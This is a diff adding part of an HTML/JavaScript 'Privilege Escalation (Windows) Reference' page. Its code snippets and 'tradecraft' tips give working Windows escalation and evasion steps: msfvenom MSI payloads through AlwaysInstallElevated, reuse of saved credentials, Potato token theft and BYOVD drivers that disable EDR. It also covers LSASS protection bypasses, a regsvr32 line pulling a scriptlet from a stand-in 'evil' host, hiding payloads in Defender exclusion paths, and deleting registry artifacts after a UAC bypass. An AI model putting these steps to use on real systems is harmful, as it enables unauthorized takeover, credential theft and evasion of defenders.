+{t:"AlwaysInstallElevated + stored creds",l:"ps",c:"# AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n# Both 0x1? -> msfvenom -f msi; msiexec /quiet /qn /i payload.msi\n\n# Stored credentials\ncmdkey /list\n# If found: runas /savecred /user:DOMAIN\\admin cmd.exe\n\n# Defender exclusions\nreg query \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"\n\n# Autorun registry\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"}
+];
+C.kit=[
+{t:"Full enumeration workflow",l:"bash",c:"# === PHASE 1: QUICK WINS (30 sec) ===\nwhoami /priv\nwhoami /groups\ncmdkey /list\nreg query HKLM\\...\\Installer /v AlwaysInstallElevated\nreg query HKCU\\...\\Installer /v AlwaysInstallElevated\n\n# === PHASE 2: SERVICES (2 min) ===\nwmic service get name,pathname,startmode | findstr /v '\"'\n# accesschk -uwcqv \"Users\" * /accepteula\n\n# === PHASE 3: AUTOMATED (5 min) ===\n.\\winPEASx64.exe\n# Or: Import-Module PowerUp.ps1; Invoke-AllChecks\n# Or: Seatbelt.exe -group=all\n\n# === PHASE 4: DEEP DIVE (10+ min) ===\nschtasks /query /fo LIST /v\n# DLL hijack opportunities (ProcMon)\n# Registry + filesystem ACL audit\n# PATH directory permissions\n# Installed software CVEs\n\n# === PHASE 5: KERNEL (last resort) ===\nsysteminfo | findstr KB\n# Compare against known CVEs\n# BYOVD if SeLoadDriverPrivilege"}
+];
+C.byp=[
+{t:"Defense bypass methodology",l:"bash",c:"# Credential Guard active?\n# -> DCSync over network instead of LSASS dump\n# -> DPAPI abuse for cached credentials\n# -> Kerberos ticket extraction still works\n\n# PPL on LSASS?\n# -> PPLFault (exploit implementation bug)\n# -> BYOVD kernel driver reads LSASS\n# -> mimidrv.sys (mimikatz driver)\n\n# AppLocker?\n# -> regsvr32 /s /n /u /i:http://evil scrobj.dll\n# -> msbuild.exe inline task\n# -> CMSTP.exe /ni /s payload.inf\n\n# WDAC?\n# -> LOLBins in trusted paths only\n# -> Much harder than AppLocker\n\n# Defender + Tamper Protection?\n# -> AMSI bypass + ETW patch (in-memory)\n# -> Check exclusion paths\n# -> Cannot disable from admin (portal only)"}
+];
+return C[s]||[];
+}
+var TR={
+tok:[
+{t:"SeImpersonate is the golden privilege for service accounts",d:"IIS AppPool, MSSQL, and most Windows services have SeImpersonatePrivilege. This single privilege enables all Potato attacks. Always check whoami /priv first."},
+{t:"SeDebugPrivilege lets you own any process",d:"Open a handle to any process including SYSTEM processes. Steal tokens from winlogon.exe, lsass.exe, or services.exe. Instant SYSTEM."},
+{t:"SeBackup/SeRestore are file system superpowers",d:"SeBackupPrivilege reads any file (dump SAM/SYSTEM hives). SeRestorePrivilege writes any file (replace service DLLs). Often overlooked."},
+{t:"Named pipe impersonation is the Potato foundation",d:"All Potato attacks trick SYSTEM into connecting to your named pipe, then call ImpersonateNamedPipeClient() to steal the SYSTEM token."}
+],
+uac:[
+{t:"UAC bypass only works for local admins",d:"Elevates medium to high integrity. User must already be in local Administrators group. Doesn't escalate standard user to admin."},
+{t:"fodhelper is the most reliable current bypass",d:"ms-settings registry hijack works on most Windows 10/11 builds. Clean, simple, well-tested."},
+{t:"CMSTPLUA COM bypass works without files on disk",d:"COM object method: no EXE drop, no registry mod needed. Instantiate COM, call ShellExec. Clean in-memory operation."},
+{t:"Always clean up registry keys after UAC bypass",d:"The hijacked HKCU\\Software\\Classes\\ms-settings keys are suspicious artifacts. Delete immediately after execution."}
+],
+svc:[
+{t:"Unquoted paths are the easiest service exploit",d:"Spaces in path + no quotes = Windows tries shorter path components first. Drop binary at right location. No restart needed if auto-restart enabled."},
+{t:"accesschk.exe is essential for service auditing",d:"Run accesschk -uwcqv 'Everyone' * to find modifiable services. SERVICE_CHANGE_CONFIG allows binPath modification."},
+{t:"Process Monitor reveals DLL hijacking opportunities",d:"Filter: Result=NAME NOT FOUND, Path ends with .dll. Each result is a potential hijack vector."},
+{t:"Service DLLs must export specific functions",d:"svchost-hosted: must export ServiceMain. General loading: DllMain is sufficient. Wrong exports = service fails to start."}
+],
+pot:[
+{t:"GodPotato is the current gold standard",d:"Works on Server 2022 and Windows 11. No outbound connection needed. DCOM/RPCSS abuse bypassing previous mitigations."},
+{t:"PrintSpoofer is the simplest option",d:"One binary, no dependencies, no network. Named pipe via Print Spooler. Works unless Spooler is disabled."},
+{t:"SweetPotato auto-selects the best method",d:"Tries Rotten, Juicy, and PrintSpoofer in sequence. First success wins. Good for unknown environments."},
+{t:"No SeImpersonate = no Potatoes",d:"All potato attacks require SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. Standard users don't have these."}
+],
+krn:[
+{t:"BYOVD is the nuclear option for EDR bypass",d:"Kernel driver disables all EDR: process callbacks, minifilters, ETW. HVCI blocks unsigned drivers but many signed vulnerable ones still work."},
+{t:"loldrivers.io catalogs vulnerable drivers",d:"Searchable database with vulnerability type, IOCTL codes, CVEs, and PoC links. Check before building custom exploits."},
+{t:"Token overwrite is the classic kernel primitive",d:"Kernel R/W: find your EPROCESS, find SYSTEM EPROCESS, copy Token pointer. Instant SYSTEM, no new process."},
+{t:"Kernel exploits BSOD on failure",d:"Unlike usermode, kernel failures = Blue Screen. Always test exact target build in lab. Version-specific offsets critical."}
+],
+tsk:[
+{t:"Scheduled tasks are services in disguise",d:"SYSTEM task with writable binary = same as writable service binary. Replace, trigger, get SYSTEM."},
+{t:"Task DLL hijacking persists across reboots",d:"Missing DLL from writable path = your DLL loads every trigger. Both escalation and persistence."},
+{t:"UserInitMprLogonScript is a hidden vector",d:"HKCU\\Environment\\UserInitMprLogonScript runs at every logon. Write to admin user's registry = code execution as admin."},
+{t:"All Users startup folder is often overlooked",d:"C:\\ProgramData\\...\\StartUp runs for ALL users. If writable (misconfigured), drop payload and wait for admin logon."}
+],
+reg:[
+{t:"AlwaysInstallElevated is a guaranteed SYSTEM shell",d:"Both HKLM and HKCU keys must be 1. msfvenom MSI + msiexec /quiet /qn. Rare but instant win."},
+{t:"PATH hijacking is subtle and persistent",d:"Writable directory early in PATH: any unqualified program call from a privileged context runs your binary. Hard to detect."},
+{t:"Defender exclusions reveal safe payload locations",d:"Query registry for exclusion paths. Files in excluded paths are completely invisible to Defender."},
+{t:"DLL search: app directory before System32",d:"Windows searches application directory first. Writable app directories (common in Program Files subdirs) = easy DLL hijack."}
+],
+kit:[
+{t:"WinPEAS finds 90% of vectors automatically",d:"Run first, always. Red = critical, yellow = interesting. Checks services, registry, tasks, credentials, tokens, filesystem."},
+{t:"Quick wins before automated enumeration",d:"whoami /priv, whoami /groups, cmdkey /list, AlwaysInstallElevated take 30 seconds and catch the easiest escalations."},
+{t:"PowerUp and PrivescCheck are complementary",d:"PowerUp: classic service/registry. PrivescCheck: more comprehensive, actively maintained. Run both."},
+{t:"Seatbelt maps the defensive landscape",d:"Enumerates Defender, AppLocker, LAPS, Credential Guard status. Know what defenses you face before attempting escalation."}
+],
+byp:[
+{t:"Credential Guard blocks LSASS credential extraction",d:"mimikatz sekurlsa returns nothing. Alternatives: DCSync over network, DPAPI abuse, Kerberos ticket extraction."},
+{t:"PPL on LSASS requires kernel-level bypass",d:"Only options: PPLFault (implementation exploit), BYOVD (kernel driver), or mimidrv.sys."},
+{t:"WDAC is harder to bypass than AppLocker",d:"Kernel-enforced. No usermode bypasses. Must use trusted LOLBins or exploit trusted application to load your code."},
+{t:"Tamper Protection prevents disabling Defender as admin",d:"Even SYSTEM can't disable real-time protection. Must be disabled from Defender portal. Check exclusions instead."}
+]
+};
+function render(){
+var si=SE.findIndex(function(x){return x.id===S.s}),so=SE[si];
+var codes=getCodes(S.s),tricks=TR[S.s]||[];
+var flow='';
+if(S.s==='tok')flow=fTOK();else if(S.s==='uac')flow=fUAC();else if(S.s==='svc')flow=fSVC();
+else if(S.s==='pot')flow=fPOT();else if(S.s==='krn')flow=fKRN();else if(S.s==='tsk')flow=fTSK();
+else if(S.s==='reg')flow=fREG();else if(S.s==='kit')flow=fKIT();else if(S.s==='byp')flow=fBYP();
+var chtml=codes.length===0?'<div style="color:#4b5563;padding:16px;text-align:center">No code examples.</div>':
+codes.map(function(c,i){return'<div class="cp" data-ci="'+i+'"><button class="ct2"><span class="cv">&#9654;</span><span class="tl">'+c.t+'</span>'+T(c.l,"#6b7280",1)+'</button></div>'}).join('');
+var thtml=tricks.length===0?'':
+'<div style="font-size:.68em;font-weight:800;color:#f97316;letter-spacing:.08em;margin-bottom:6px">TRADECRAFT</div>'+
+tricks.map(function(t,i){return'<div class="ti" data-ti="'+i+'"><button class="tt"><span class="cv" style="color:#f97316;font-size:10px">&#9654;</span><span class="tn">'+t.t+'</span></button></div>'}).join('');
+var pv=si>0?'<button class="nb2" data-nv="'+SE[si-1].id+'">\u2190 '+SE[si-1].l+'</button>':'';
+var nx=si<SE.length-1?'<button class="nb2" data-nv="'+SE[si+1].id+'">'+SE[si+1].l+' \u2192</button>':'';
+$('#app').innerHTML=
+'<div class="hd"><div style="display:flex;align-items:center;justify-content:space-between;flex-wrap:wrap;gap:8px;margin-bottom:6px"><div><h1>Privilege Escalation (Windows) Reference</h1><div class="sub">Tokens \u2022 UAC \u2022 Services \u2022 Potatoes \u2022 Kernel \u2022 Tasks/GPO \u2022 Registry/File \u2022 Toolkit \u2022 Bypasses</div></div></div><div class="st">'+
+SE.map(function(s){return'<button class="sb'+(S.s===s.id?' on':'')+'" style="'+(S.s===s.id?'color:'+s.c+';border-bottom-color:'+s.c:'')+'" data-sc="'+s.id+'">'+s.i+' '+s.l+'</button>'}).join('')+
+'</div></div><div class="ut"><button class="ub'+(S.t==='flow'?' on':'')+'" data-tb="flow">\u{1F4CA} Flow</button><button class="ub'+(S.t==='code'?' on':'')+'" data-tb="code">\u{1F4BB} Code'+(codes.length?' <span class="cnt">'+codes.length+'</span>':'')+'</button><button class="ub'+(S.t==='tricks'?' on':'')+'" data-tb="tricks">\u{1F512} Tradecraft'+(tricks.length?' <span class="cnt">'+tricks.length+'</span>':'')+'</button></div>'+
+'<div class="ct"><div style="display:flex;align-items:center;gap:6px;margin-bottom:6px"><span style="font-size:1em">'+so.i+'</span><h2 style="font-size:.9em;font-weight:700">'+so.l+'</h2>'+T(so.l,so.c)+'<div style="margin-left:auto;display:flex;gap:3px">'+pv+nx+'</div></div>'+
+'<div id="tf" style="'+(S.t!=='flow'?'display:none':'')+'">'+flow+'</div>'+
+'<div id="tc" style="'+(S.t!=='code'?'display:none':'')+'">'+chtml+'</div>'+
+'<div id="tt" style="'+(S.t!=='tricks'?'display:none':'')+'">'+thtml+'</div></div>'+
+'<div class="ft">'+[{c:"#f87171",l:"Tokens"},{c:"#60a5fa",l:"UAC"},{c:"#a78bfa",l:"Services"},{c:"#fbbf24",l:"Potatoes"},{c:"#34d399",l:"Kernel"},{c:"#f59e0b",l:"Tasks/GPO"},{c:"#e879f9",l:"Registry"},{c:"#f472b6",l:"Toolkit"},{c:"#fb923c",l:"Bypasses"}].map(function(x){return'<div style="display:flex;align-items:center;gap:3px"><span class="dt" style="background:'+x.c+'"></span><span style="color:#4b5563">'+x.l+'</span></div>'}).join('')+'</div>';
+$$('[data-sc]').forEach(function(b){b.onclick=function(){S.s=b.dataset.sc;S.t='flow';render()}});
+$$('[data-tb]').forEach(function(b){b.onclick=function(){S.t=b.dataset.tb;render()}});
+$$('[data-nv]').forEach(function(b){b.onclick=function(){S.s=b.dataset.nv;S.t='flow';render()}});
+$$('.cp').forEach(function(p){
+p.querySelector('.ct2').onclick=function(){
+var ex=p.querySelector('.cb'),cv=p.querySelector('.cv');
+if(ex){ex.remove();cv.classList.remove('op');return}
+cv.classList.add('op');
+var ci=parseInt(p.dataset.ci),c=codes[ci];
+var pre=document.createElement('pre');pre.className='cb mono';
+pre.innerHTML=c.c.split('\n').map(function(line){
+var ci2=line.indexOf('//');if(ci2<0)ci2=line.indexOf('#');
+if(ci2>=0)return esc(line.slice(0,ci2))+'<span class="cm">'+esc(line.slice(ci2))+'</span>';
+return esc(line);
+}).join('\n');
+p.appendChild(pre);};
+});
+$$('.ti').forEach(function(p){
+p.querySelector('.tt').onclick=function(){
+var ex=p.querySelector('.td'),cv=p.querySelector('.cv');
+if(ex){ex.remove();p.classList.remove('op');cv.classList.remove('op');return}
+p.classList.add('op');cv.classList.add('op');
+var ti=parseInt(p.dataset.ti);
+var div=document.createElement('div');div.className='td';div.textContent=tricks[ti].d;
+p.appendChild(div);};
+});
+}
+render();
+</script>
+</body>
+</html>
